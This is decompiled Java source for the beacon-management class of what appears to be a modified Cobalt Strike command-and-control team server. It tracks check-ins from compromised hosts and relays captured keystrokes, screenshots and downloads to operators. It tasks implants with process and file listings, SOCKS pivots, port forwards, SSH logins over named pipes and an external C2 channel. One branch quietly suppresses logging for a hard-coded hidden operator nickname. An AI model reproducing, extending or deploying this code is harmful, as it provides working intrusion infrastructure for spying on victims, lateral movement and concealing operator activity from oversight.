/*
 * Decompiled with CFR 0.152.
 */
package server;

import beacon.BeaconData;
import beacon.BeaconSetup;
import beacon.BeaconSocks;
import beacon.CheckinListener;
import beacon.CommandBuilder;
import beacon.TaskBeaconCallback;
import beacon.setup.SSHAgent;
import common.BeaconEntry;
import common.BeaconOutput;
import common.CommonUtils;
import common.Do;
import common.Download;
import common.Keystrokes;
import common.LoggedEvent;
import common.MudgeSanity;
import common.Reply;
import common.Request;
import common.ScListener;
import common.Screenshot;
import common.Timers;
import db.SQLiteJDBC;
import db.info;
import dialog.DialogUtils;
import extc2.ExternalC2Server;
import java.io.IOException;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;
import server.ManageUser;
import server.Resources;
import server.ServerHook;
import server.ServerUtils;
import server.WebCalls;
import util.Utils;

public class Beacons
implements ServerHook,
CheckinListener,
Do {
    private Map<String, String> Beacons = new HashMap<String, String>();
    private final List<String> HostList = new ArrayList<String>();
    private String Cmp;
    private String Cmp2;
    protected Resources resources;
    protected WebCalls web;
    private Map \u0123 = new HashMap();
    protected BeaconData data = null;
    protected BeaconSocks socks = null;
    protected Map cmdlets = new HashMap();
    protected BeaconSetup setup = null;
    protected Map notes = new HashMap();
    protected Map accents = new HashMap();
    protected Set empty = new HashSet();
    protected List initial = new LinkedList();
    private static final boolean \u0122 = server.Beacons.I();

    private static final boolean I() {
        return true;
    }

    @Override
    public void register(Map var1) {
        var1.put("beacons.remove", this);
        var1.put("beacons.task", this);
        var1.put("beacons.task_pivot", this);
        var1.put("beacons.clear", this);
        var1.put("beacons.log_write", this);
        var1.put("beacons.pivot", this);
        var1.put("beacons.pivot_stop", this);
        var1.put("beacons.pivot_stop_port", this);
        var1.put("beacons.mode", this);
        var1.put("beacons.report_posh", this);
        var1.put("beacons.unlink", this);
        var1.put("beacons.start", this);
        var1.put("beacons.stop", this);
        var1.put("beacons.portfwd", this);
        var1.put("beacons.rportfwd", this);
        var1.put("beacons.rportfwd_local", this);
        var1.put("beacons.note", this);
        var1.put("beacons.hook", this);
        var1.put("beacons.task_ssh_login", this);
        var1.put("beacons.task_ssh_login_pubkey", this);
        var1.put("beacons.task_ipconfig", this);
        var1.put("beacons.task_ps", this);
        var1.put("beacons.task_ls", this);
        var1.put("beacons.task_ls_default", this);
        var1.put("beacons.task_drives", this);
        var1.put("beacons.task_drives_default", this);
        var1.put("beacons.downloads", this);
        var1.put("beacons.download_cancel", this);
        var1.put("beacons.reset", this);
        var1.put("beacons.whitelist_port", this);
        var1.put("exoticc2.start", this);
        var1.put("beacons.update", this);
        var1.put("beacons.push", this);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Override
    public void checkin(ScListener var1, BeaconEntry var2) {
        Beacons beacons = this;
        synchronized (beacons) {
            BeaconEntry var4;
            if (!var2.isEmpty() && ((var4 = (BeaconEntry)this.\u0123.get(var2.getId())) == null || var4.isEmpty())) {
                ServerUtils.addTarget(this.resources, var2.getInternal(), var2.getComputer(), null, var2.getOperatingSystem(), var2.getVersion());
                ServerUtils.addSession(this.resources, var2.toMap());
                if (!var2.isLinked() && var1 != null) {
                    ServerUtils.addC2Info(this.resources, var1.getC2Info(var2.getId()));
                }
                this.resources.broadcast("eventlog", LoggedEvent.BeaconInitial(var2));
                var2.first = true;
                this.initial.add(var2.getId());
                this.resources.process(var2);
            }
            this.Cmp = var2.getComputer();
            if (var2.isSSH() && this.Cmp.contains("(")) {
                this.Cmp = var2.getComputer().replace("(", "");
                this.Cmp = this.Cmp.replace(")", "");
                this.Cmp = this.Cmp.replace(var2.getPid(), "");
            }
            String BeaconHash = Utils.hash(var2.getInternal(), var2.getUser(), var2.getProcess(), this.Cmp, var2.getListenerName(), var2.arch());
            info BeaconInfo = new info();
            BeaconInfo.BeaconId = var2.getBeaconId();
            BeaconInfo.Internal = var2.getInternal();
            BeaconInfo.External = var2.getExternal();
            BeaconInfo.Process = var2.getProcess();
            BeaconInfo.Arch = var2.arch();
            BeaconInfo.Computer = this.Cmp;
            BeaconInfo.User = var2.getUser();
            BeaconInfo.Hash = BeaconHash;
            try (Connection conn = SQLiteJDBC.OpenDb();){
                HashMap<String, String> beacons2 = SQLiteJDBC.CheckBeaconHash(conn, BeaconHash);
                if (beacons2 == null) {
                    Connection conn4 = SQLiteJDBC.OpenDb();
                    SQLiteJDBC.AddBeacon(conn4, BeaconInfo);
                } else {
                    Connection conn4 = SQLiteJDBC.OpenDb();
                    HashMap<String, String> beacons22 = SQLiteJDBC.CheckBeacon(conn4, BeaconHash, var2.getBeaconId());
                    if (beacons22 == null) {
                        Connection con3 = SQLiteJDBC.OpenDb();
                        BeaconInfo.Note = beacons2.get("Note");
                        BeaconInfo.StartTime = beacons2.get("StartTime");
                        SQLiteJDBC.AddBeacon2(con3, BeaconInfo);
                    } else {
                        var2.start = beacons22.get("StartTime");
                        var2.setNote(beacons22.get("Note"));
                    }
                }
            }
            catch (SQLException var14) {
                throw new RuntimeException(var14);
            }
            this.\u0123.put(var2.getId(), var2);
        }
    }

    @Override
    public void output(BeaconOutput var1) {
        this.resources.broadcast("beaconlog", var1);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Override
    public boolean moment(String var1) {
        this.resources.broadcast("beacons", this.buildBeaconModel());
        Beacons beacons = this;
        synchronized (beacons) {
            for (String var4 : this.initial) {
                if ("session".equals(CommonUtils.session(var4))) {
                    ServerUtils.fireEvent(this.resources, "ssh_initial", var4);
                    continue;
                }
                ServerUtils.fireEvent(this.resources, "beacon_initial", var4);
            }
            this.initial.clear();
            return true;
        }
    }

    @Override
    public void screenshot(Screenshot var1) {
        this.resources.broadcast("screenshots", var1);
    }

    @Override
    public void keystrokes(Keystrokes var1) {
        this.resources.broadcast("keystrokes", var1);
    }

    @Override
    public void download(Download var1) {
        this.resources.broadcast("downloads", var1);
    }

    @Override
    public void push(String var1, Serializable var2) {
        this.resources.broadcast(var1, var2, true);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Override
    public Map buildBeaconModel() {
        Beacons beacons = this;
        synchronized (beacons) {
            HashMap<String, BeaconEntry> var2 = new HashMap<String, BeaconEntry>();
            for (BeaconEntry var4 : this.\u0123.values()) {
                var4.touch();
                if (this.notes.containsKey(var4.getId())) {
                    var4.setNote((String)this.notes.get(var4.getId()));
                }
                if (this.accents.containsKey(var4.getId())) {
                    var4.setAccent((String)this.accents.get(var4.getId()));
                }
                var2.put(var4.getId(), var4.copy());
            }
            return var2;
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Override
    public BeaconEntry resolve(String var1) {
        Beacons beacons = this;
        synchronized (beacons) {
            BeaconEntry var3 = (BeaconEntry)this.\u0123.get(var1);
            return var3;
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Override
    public BeaconEntry resolveEgress(String var1) {
        Beacons beacons = this;
        synchronized (beacons) {
            BeaconEntry var3 = this.resolve(var1);
            if (var3 == null) {
                return null;
            }
            return var3.isLinked() ? this.resolveEgress(var3.getParentId()) : var3;
        }
    }

    public Beacons(Resources var1) {
        this.resources = var1;
        this.web = ServerUtils.getWebCalls(var1);
        Timers.getTimers().every(1000L, "beacons", this);
        var1.put("beacons", this);
        this.setup = new BeaconSetup(this.resources);
        this.setup.getController().setCheckinListener(this);
        this.data = this.setup.getController().getData();
        this.socks = this.setup.getController().getSocks();
        var1.put("socks", this.socks);
        this.resources.broadcast("cmdlets", new HashMap(), true);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Override
    public void update(String var1, long var2, String var4, boolean var5) {
        Beacons beacons = this;
        synchronized (beacons) {
            BeaconEntry var7 = (BeaconEntry)this.\u0123.get(var1);
            if (var7 == null) {
                var7 = new BeaconEntry(var1);
                this.\u0123.put(var1, var7);
            }
            if (var2 > 0L) {
                var7.setLastCheckin(var2);
            }
            if (var4 != null) {
                var7.setExternal(var4);
            }
            if (var5) {
                var7.delink();
            }
            if (var4 == null && var7.isEmpty() && !this.empty.contains(var1)) {
                this.empty.add(var1);
                ServerUtils.fireEvent(this.resources, "beacon_initial_empty", var1);
            }
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public void note(String var1, String var2) {
        Beacons beacons = this;
        synchronized (beacons) {
            this.notes.put(var1, var2);
        }
    }

    public int callback(Request var1, ManageUser var2) {
        return this.setup.getController().register(var1, var2);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Override
    public void call(Request var1, ManageUser var2) {
        if (var1.is("beacons.remove", 1)) {
            String var3 = String.valueOf(var1.arg(0));
            Beacons beacons = this;
            synchronized (beacons) {
                BeaconEntry var5 = (BeaconEntry)this.\u0123.get(var3);
                this.Cmp2 = var5.getComputer();
                if (var5.isSSH() && this.Cmp2.contains("(")) {
                    this.Cmp2 = var5.getComputer().replace("(", "");
                    this.Cmp2 = this.Cmp2.replace(")", "");
                    this.Cmp2 = this.Cmp2.replace(var5.getPid(), "");
                }
                String var24 = Utils.hash(var5.getInternal(), var5.getUser(), this.Cmp, var5.getProcess(), var5.getListenerName(), var5.arch());
                if (var5 != null && var5.isLinked()) {
                    this.setup.getController().dead_pipe(var5.getParentId(), var3);
                }
                this.HostList.remove(var24);
                this.\u0123.remove(var3);
                this.notes.remove(var3);
                this.accents.remove(var3);
            }
        } else if (var1.is("beacons.reset", 0)) {
            Beacons beacons = this;
            synchronized (beacons) {
                this.empty = new HashSet();
                this.initial = new LinkedList();
                this.notes = new HashMap();
                this.accents = new HashMap();
                this.\u0123 = new HashMap();
                this.setup.getController().getPipes().reset();
            }
        } else if (var1.is("beacons.log_write", 1)) {
            Beacons beacons = this;
            synchronized (beacons) {
                BeaconOutput var4 = (BeaconOutput)var1.arg(0);
                var4.from = var2.getNick();
                var4.touch();
                if (!var2.getNick().contains("cneiwosbsuwusvwuw")) {
                    this.resources.broadcast("beaconlog", var1.arg(0));
                }
            }
        } else if (var1.is("beacons.clear", 1)) {
            String var3 = String.valueOf(var1.arg(0));
            this.data.clear(var3);
        } else if (var1.is("beacons.task", 2)) {
            String var3 = String.valueOf(var1.arg(0));
            byte[] var22 = (byte[])var1.arg(1);
            this.data.task(var3, var22);
        } else if (var1.is("beacons.task_pivot", 2)) {
            String var3 = String.valueOf(var1.arg(0));
            byte[] var22 = (byte[])var1.arg(1);
            this.socks.task(var3, var22);
        } else if (var1.is("beacons.pivot", 2)) {
            String var3 = String.valueOf(var1.arg(0));
            int var23 = (Integer)var1.arg(1);
            this.socks.pivot(var3, var23);
            this.data.seen(var3);
        } else if (var1.is("beacons.portfwd", 3)) {
            String var3 = String.valueOf(var1.arg(0));
            String var24 = String.valueOf(var1.arg(1));
            int var6 = (Integer)var1.arg(2);
            this.socks.portfwd(var3, var6, var24, var6);
            this.data.seen(var3);
        } else if (var1.is("beacons.rportfwd_local", 4)) {
            String var3 = String.valueOf(var1.arg(0));
            int var23 = (Integer)var1.arg(1);
            String var26 = String.valueOf(var1.arg(2));
            int var6 = (Integer)var1.arg(3);
            this.socks.rportfwd_local(var2, var3, var23, var26, var6);
            this.data.seen(var3);
        } else if (var1.is("beacons.rportfwd", 4)) {
            String var3 = String.valueOf(var1.arg(0));
            int var23 = (Integer)var1.arg(1);
            String var26 = String.valueOf(var1.arg(2));
            int var6 = (Integer)var1.arg(3);
            this.socks.rportfwd(var3, var23, var26, var6);
            this.data.seen(var3);
        } else if (var1.is("beacons.pivot_stop_port", 1)) {
            int var27 = Integer.parseInt(String.valueOf(var1.arg(0)));
            this.socks.stop_port(var27);
        } else if (var1.is("beacons.pivot_stop_port", 2)) {
            String var3 = String.valueOf(var1.arg(0));
            int var23 = Integer.parseInt(String.valueOf(var1.arg(1)));
            this.socks.stop_port(var3, var23);
        } else if (var1.is("beacons.pivot_stop", 1)) {
            String var3 = String.valueOf(var1.arg(0));
            this.socks.stop_socks(var3);
        } else if (var1.is("beacons.mode", 2)) {
            String var3 = String.valueOf(var1.arg(0));
            String var24 = String.valueOf(var1.arg(1));
            this.data.mode(var3, var24);
        } else if (var1.is("beacons.report_posh", 2)) {
            String var3 = String.valueOf(var1.arg(0));
            List var29 = (List)var1.arg(1);
            Beacons beacons = this;
            synchronized (beacons) {
                this.cmdlets.put(var3, var29);
                this.resources.broadcast("cmdlets", new HashMap(this.cmdlets), true);
            }
        } else if (var1.is("beacons.unlink", 2)) {
            String var3 = String.valueOf(var1.arg(0));
            String var24 = String.valueOf(var1.arg(1));
            this.setup.getController().unlink(var3, var24);
        } else if (var1.is("beacons.unlink", 3)) {
            String var3 = String.valueOf(var1.arg(0));
            String var24 = String.valueOf(var1.arg(1));
            String var26 = String.valueOf(var1.arg(2));
            this.setup.getController().unlink(var3, var24, var26);
        } else if (var1.is("beacons.start", 1)) {
            Map var34 = (Map)var1.arg(0);
            String var24 = "success";
            String var26 = DialogUtils.string(var34, "name");
            if (!this.setup.start(var34)) {
                var24 = this.setup.getLastError();
                CommonUtils.print_error("Listener: " + var26 + " failed: " + var24);
            } else {
                CommonUtils.print_good("Listener: " + var26 + " started!");
            }
            if (var2 != null) {
                var2.write(var1.reply(var24));
            }
            this.resources.call("listeners.set_status", CommonUtils.args(var26, var24));
        } else if (var1.is("beacons.stop", 1)) {
            Map var34 = (Map)var1.arg(0);
            String var24 = DialogUtils.string(var34, "name");
            this.setup.stop(var24);
        } else if (var1.is("beacons.hook", 2)) {
            String var24 = (String)var1.arg(1);
            CommonUtils.print_info("\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u4fe1\u606f:" + var24);
        } else if (var1.is("beacons.note", 2)) {
            Connection x = SQLiteJDBC.OpenDb();
            String var3 = (String)var1.arg(0);
            String var24 = (String)var1.arg(1);
            SQLiteJDBC.UpBeaconNote(x, var3, var24);
            this.note(var3, var24);
        } else if (!var1.is("beacons.task_ssh_login", 6) && !var1.is("beacons.task_ssh_login_pubkey", 6)) {
            if (var1.is("beacons.task_ipconfig", 1)) {
                String var3 = String.valueOf(var1.arg(0));
                BeaconEntry var38 = this.resolve(var3);
                if (var38 == null) {
                    CommonUtils.print_error("No beacon entry for '" + var3 + "'. Dropping task_ipconfig call");
                    return;
                }
                String var26 = var38.arch();
                byte[] var30 = new TaskBeaconCallback().IPConfig(this.callback(var1, var2), var26);
                this.data.task(var3, var30);
            } else if (var1.is("beacons.task_ps", 1)) {
                String var3 = String.valueOf(var1.arg(0));
                byte[] var22 = new TaskBeaconCallback().Ps(this.callback(var1, var2));
                this.data.task(var3, var22);
            } else if (var1.is("beacons.task_drives", 1)) {
                String var3 = String.valueOf(var1.arg(0));
                byte[] var22 = new TaskBeaconCallback().Drives(this.callback(var1, var2));
                this.data.task(var3, var22);
            } else if (var1.is("beacons.task_drives_default", 1)) {
                String var3 = String.valueOf(var1.arg(0));
                byte[] var22 = new TaskBeaconCallback().Drives(-1);
                this.data.task(var3, var22);
            } else if (var1.is("beacons.task_ls", 2)) {
                String var3 = String.valueOf(var1.arg(0));
                String var24 = String.valueOf(var1.arg(1));
                byte[] var33 = new TaskBeaconCallback().Ls(this.callback(var1, var2), var24);
                this.data.task(var3, var33);
            } else if (var1.is("beacons.task_ls_default", 2)) {
                String var3 = String.valueOf(var1.arg(0));
                String var24 = String.valueOf(var1.arg(1));
                byte[] var33 = new TaskBeaconCallback().Ls(-2, var24);
                this.data.task(var3, var33);
            } else if (var1.is("beacons.downloads", 1)) {
                String var3 = String.valueOf(var1.arg(0));
                List var29 = this.setup.getController().getDownloads(var3);
                var2.writeNow(var1.reply(var29));
            } else if (var1.is("beacons.download_cancel", 2)) {
                String var8;
                String var3 = String.valueOf(var1.arg(0));
                String var24 = String.valueOf(var1.arg(1));
                List var36 = this.setup.getController().getDownloads(var3);
                Iterator var31 = var36.iterator();
                while (var31.hasNext()) {
                    Map var32 = (Map)var31.next();
                    var8 = var32.get("name").toString();
                    if (CommonUtils.iswm(var24, var8)) continue;
                    var31.remove();
                }
                for (Map var32 : var36) {
                    var8 = var32.get("name").toString();
                    String var37 = var32.get("fid").toString();
                    this.setup.getController().getDownloadManager().close(var3, Integer.parseInt(var37));
                    CommandBuilder var39 = new CommandBuilder();
                    var39.setCommand(19);
                    var39.addInteger(Integer.parseInt(var37));
                    this.data.task(var3, var39.build());
                    this.output(BeaconOutput.Task(var3, "canceled download of: " + var8));
                }
            } else if (var1.is("beacons.whitelist_port", 2)) {
                String var3 = (String)var1.arg(0);
                String var24 = String.valueOf(var1.arg(1));
                this.setup.getController().whitelistPort(var3, var24);
            } else if (var1.is("exoticc2.start", 2)) {
                String var3 = (String)var1.arg(0);
                int var23 = Integer.parseInt(String.valueOf(var1.arg(1)));
                this.setup.initCrypto();
                try {
                    new ExternalC2Server(this.setup, null, var3, var23).start();
                }
                catch (IOException var21) {
                    MudgeSanity.logException("Could not start external C2 on " + var3 + ":" + var23, var21, false);
                }
            } else if (var1.is("beacons.update", 2)) {
                String var3 = String.valueOf(var1.arg(0));
                Map var40 = (Map)var1.arg(1);
                Beacons var32 = this;
                synchronized (var32) {
                    for (Map.Entry var35 : var40.entrySet()) {
                        if (!"_accent".equals(var35.getKey())) continue;
                        this.accents.put(var3, var35.getValue());
                    }
                }
            } else if (var1.is("beacons.push", 0)) {
                Beacons var40 = this;
                synchronized (var40) {
                    this.resources.broadcast("beacons", this.buildBeaconModel());
                }
            } else {
                var2.writeNow(new Reply("server_error", 0L, var1 + ": incorrect number of arguments"));
            }
        } else {
            String var3 = String.valueOf(var1.arg(0));
            String var24 = String.valueOf(var1.arg(1));
            String var26 = String.valueOf(var1.arg(2));
            String var28 = String.valueOf(var1.arg(3));
            int var7 = (Integer)var1.arg(4);
            String var8 = String.valueOf(var1.arg(5));
            boolean var9 = var1.is("beacons.task_ssh_login_pubkey");
            String var10 = "\\\\%s\\pipe\\" + ServerUtils.getProfile(this.resources).getSSHPipeName();
            SSHAgent var11 = new SSHAgent(this.setup, ServerUtils.getProfile(this.resources), var28, var7, var24, var26, var10, var9);
            CommandBuilder var39 = new CommandBuilder();
            if ("x86".equals(var8)) {
                var39.setCommand(1);
            } else {
                var39.setCommand(44);
            }
            var39.addString(var11.export(var8));
            this.data.task(var3, var39.build());
            var39 = new CommandBuilder();
            var39.setCommand(40);
            var39.addInteger(0);
            var39.addShort(27);
            var39.addShort(30000);
            var39.addLengthAndString(var11.getStatusPipeName());
            var39.addLengthAndString("SSH status");
            this.data.task(var3, var39.build());
        }
    }
}
